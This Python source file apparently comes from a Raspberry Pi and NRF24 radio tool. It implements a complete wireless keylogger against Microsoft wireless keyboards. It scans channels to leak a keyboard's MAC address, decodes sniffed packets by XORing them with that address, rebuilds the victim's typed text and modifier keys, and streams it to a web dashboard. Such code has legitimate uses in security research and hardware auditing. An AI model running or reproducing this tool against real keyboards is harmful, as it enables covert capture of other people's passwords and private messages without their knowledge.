import os
import string

import nrf24
import pigpio
import time
import traceback

import core.hid_codes as hid_codes
from core.helpers import is_key_event_packet
from core.configurator import NRFConfigurator
from core.limited_array import LimitedArray
from flask_socketio import SocketIO


class StateMachine:
    def __init__(self, app, socketio: SocketIO):
        self.app = app
        self.socketio = socketio
        self.ipAddress = "localhost"  # IP address of Raspberry Pi Zero 2W
        self.port = "8888"  # pigpiod port of Raspberry Pi Zero 2W
        self.pi = None
        self.nrf = None
        self.mac = None
        self.chan = None
        self.power = 0
        # Reserve buffer to store 1024 newest-captured chars
        self.buffer = LimitedArray(1024)
        self.state = 'Idle'

    def idle_state(self):
        self.state = 'Idle'
        # Emit websocket event to the UI client
        self.socketio.emit('state', {'state': self.state}, namespace='/')
        print(self.state)

        if self.pi is None or not self.pi.connected:
            while True:
                # Try connecting to the Raspberry Pi IP address and pigpiod port
                self.pi = pigpio.pi(self.ipAddress, self.port)

                if self.pi.connected:
                    self.socketio.emit(
                        'ms', {'ms': "Established connection with Raspberry Pi Zero 2W"}, namespace='/')
                    print("Established connection with Raspberry Pi Zero 2W")
                    break

                self.socketio.emit(
                    'ms', {'ms': "Retrying to establish a connection with Raspberry Pi Zero 2W"}, namespace='/')
                print("Retrying to establish a connection with Raspberry Pi Zero 2W")
                time.sleep(2)  # Wait for 2 seconds before retrying

        # Close P0 reading pipe if it was open
        if self.nrf is not None:
            self.nrf.close_reading_pipe(nrf24.RF24_RX_ADDR.P0)
            self.socketio.emit(
                'ms', {'ms': "Returned to Idle state"}, namespace='/')
            print("Returned to Idle state")

    def listening_state(self):
        self.state = 'Listening'
        self.socketio.emit('state', {'state': self.state}, namespace='/')
        self.socketio.sleep(0)
        print(self.state)

        if self.pi is not None:
            self.socketio.emit(
                'ms', {'ms': f"The device is now listening for Microsoft Wireless Keyboard<br><br>Power level: {self.power}"}, namespace='/')
            print(
                f"The device is now listening for Microsoft Wireless Keyboard\nPower level: {self.power}")

            # Configure NRF24 chip to leak keyboard's MAC address
            self.nrf = NRFConfigurator.configure_for_mac_cracking(
                self.pi, self.power)

            # List of most common channels that Microsoft keyboard resides on
            common_channels = [5, 9, 21, 25, 29, 31, 44, 52, 54, 56, 72, 76]

            while self.state == 'Listening':
                for chan in common_channels:  # Iterate the list of most common channels
                    self.chan = chan
                    self.nrf.set_channel(self.chan)
                    probed_time = time.time()  # Save current timestamp

                    while time.time() - probed_time < 1:  # Listen for exactly 1 second on each channel
                        payload = self.nrf.get_payload()

                        # If the 5th byte is different than 0xcd - it is not Microsoft keyboard
                        if payload[4] != 0xcd:
                            continue

                        # Print channel and possible keyboard packet in hex form
                        print(chan, ':'.join(f'{i:02x}' for i in payload))

                        # Bitwise shift 7th byte left by one to verify packet validity
                        if (payload[6] & 0x7f) << 1 != 0x0a:
                            continue

                        # Bitwise shift 8th byte left by one to verify packet validity
                        if payload[7] << 1 != 0x38 and payload[7] << 1 != 0x78:
                            continue

                        # If the checks above did not filter packet out - the keyboard MAC address was found
                        # store result in hex form, and reverse, as it is transferred in little-endian format
                        self.mac = ':'.join(
                            f'{i:02x}' for i in payload[0:5][::-1])

                        self.socketio.emit('ms', {
                            'ms': f"KEYBOARD FOUND!<br>MAC address: {self.mac}<br>Channel: {self.chan}"}, namespace='/')
                        print("KEYBOARD FOUND!", self.chan, self.mac)

                        return

                # If most common channels failed - iterate from 2.403 to 2.481 frequency
                common_channels = range(3, 81)
        else:
            self.socketio.emit(
                'ms', {'ms': f"There is no connection with Raspberry Pi, try Idle state first<br><br>Power level: {self.power}"}, namespace='/')
            print(
                f"There is no connection with Raspberry Pi, try Idle state first\nPower level: {self.power}")

    def sniffing_state(self):
        self.state = 'Sniffing'
        self.socketio.emit('state', {'state': self.state}, namespace='/')
        print(self.state)

        if all([self.pi, self.nrf, self.mac, self.chan]):
            # As a precaution, close P0 reading pipe, whether it was open or not
            self.nrf.close_reading_pipe(nrf24.RF24_RX_ADDR.P0)

            # Reserve array of 8, to store last eight packet sequence ids
            sequence_id_log = LimitedArray(8)
            last_key = None

            # Operate on GPIO interrupts, as they offer minimal computational overhead
            def gpio_interrupt(gpio, level, tick):
                nonlocal last_key

                while self.nrf.data_ready() and self.state == 'Sniffing':
                    payload = self.nrf.get_payload()

                    if not is_key_event_packet(payload):
                        # print("Not a key event packet")
                        continue

                    # Store sequence id in a variable
                    sequence_id = payload[4:6]

                    # Convert hex sequence id value to integer
                    sequence_number = int(
                        "".join(f"{i:02x}" for i in sequence_id[::-1]),
                        base=16
                    )

                    if sequence_number in sequence_id_log:
                        # print("Skipping duplicate sequence_id", sequence_id)
                        continue

                    # XOR with first byte of leaked MAC address
                    hid_key = payload[9] ^ int(self.mac[0:2], 16)

                    key = f'0x{hid_key:02x}'

                    # XOR with fourth byte of leaked MAC address
                    hid_knyfel = payload[7] ^ int(self.mac[9:11], 16)

                    knyfel = f'0x{hid_knyfel:02x}'

                    if hid_key != 0 and f"{payload[10]:x}" == self.mac[3:5]:
                        last_key = hid_key

                        if hid_key == 0x2c:
                            # Append space to buffer if hid_key is spacebar
                            self.buffer.append(' ')
                        elif hid_key >= 0x04 and hid_key <= 0x1d:
                            if hid_knyfel == 0x20 or hid_knyfel == 0x02:
                                # Append uppercase letter to buffer if hid_knyfel is either 0x20 (RSHIFT) or 0x02 (LSHIFT)
                                self.buffer.append(
                                    string.ascii_uppercase[last_key - 4])  # [last_key - 4] because ASCII letter A is equal to 0x04, thus to start from 0...
                            elif hid_knyfel != 0x00:
                                # Append combo keypress (modifier + lowercase letter) to buffer if hid_key is a letter key and hid_knyfel is not 0x00
                                self.buffer.append(
                                    f"<{hid_codes.USB_HID_MODIFIERS_HUMAN[knyfel]} + {string.ascii_lowercase[last_key - 4]}>")
                            else:
                                if sequence_id_log.get_last_item() - sequence_number != 1:
                                    # Append lowercase letter to buffer if hid_key is a letter key and the sequence_id difference is not 1
                                    self.buffer.append(
                                        string.ascii_lowercase[last_key - 4])
                        elif hid_key >= 0x1e and hid_key <= 0x27:
                            if hid_knyfel == 0x20 or hid_knyfel == 0x02:
                                # Append special character to buffer if hid_knyfel is either 0x20 (RSHIFT) or 0x02 (LSHIFT)
                                special_chars = [
                                    ')', '!', '@', '#', '$', '%', '^', '&', '*', '(']
                                self.buffer.append(
                                    special_chars[(last_key - 29) % 10])
                            else:
                                # Append digit to buffer if hid_key is a number key
                                self.buffer.append(
                                    string.digits[(last_key - 29) % 10])
                        else:
                            if hid_key >= 0x2d and hid_key <= 0x38:
                                if hid_knyfel == 0x20 or hid_knyfel == 0x02:
                                    # Append special character to buffer if hid_knyfel is either 0x20 (RSHIFT) or 0x02 (LSHIFT)
                                    special_chars = [
                                        '_', '+', '{', '}', '~', '|', ':', '"', '~', '<', '>', '?']
                                    self.buffer.append(
                                        special_chars[(last_key - 45) % 12])
                                else:
                                    # Append human-readable key name to buffer for lowercase hid_key values
                                    self.buffer.append(
                                        f"{hid_codes.USB_HID_KEYS_HUMAN[key]}")
                            else:
                                # Append key name to buffer for other hid_key values
                                self.buffer.append(
                                    f"<{hid_codes.USB_HID_KEYS_HUMAN[key]}>")

                        print(
                            sequence_number,
                            f'Channel: {self.chan} | Packet: '
                            f'{":".join(hex(x) for x in payload)} | '
                            f"HID_KEY: "
                            f"{hid_key} | Key: "
                            f"{hid_codes.USB_HID_KEYS_HUMAN[key]}"
                        )

                        # Store sequence id, to display keypresses only once
                        sequence_id_log.append(sequence_number)

                        with self.app.app_context():
                            self.socketio.emit(
                                'ms', {'ms': f"{''.join(self.buffer)}"}, namespace='/')
                            self.socketio.sleep(0)

                        # print(payload)
                        print("".join(self.buffer))

            # Configure NRF24 chip to listen on leaked MAC address and observed channel
            self.nrf = NRFConfigurator.configure_for_sniffing(
                self.pi, self.mac, self.chan, gpio_interrupt, self.power)

            # Enter a loop to prevent app from stopping
            try:
                while self.state == 'Sniffing':
                    time.sleep(1)
            except:
                traceback.print_exc()
                self.nrf.power_down()
                self.pi.stop()
        else:
            self.socketio.emit(
                'ms', {'ms': f"There is no connection with Raspberry Pi, try Idle state first<br><br>Power level: {self.power}"}, namespace='/')
            print(
                f"There is no connection with Raspberry Pi, try Idle state first\nPower level: {self.power}")

    def aborting_state(self):
        self.state = 'Aborting'
        self.socketio.emit('state', {'state': self.state}, namespace='/')
        print(self.state)

        if self.pi is not None or self.pi.connected and self.nrf is not None:
            # Power down NRF24, close pigpiod and shutdown Raspberry Pi
            self.socketio.emit(
                'ms', {'ms': "The device will shut itself down now"}, namespace='/')
            print("The device will shut itself down now")
            self.nrf.power_down()
            self.pi.stop()
            os.system("sudo shutdown now")
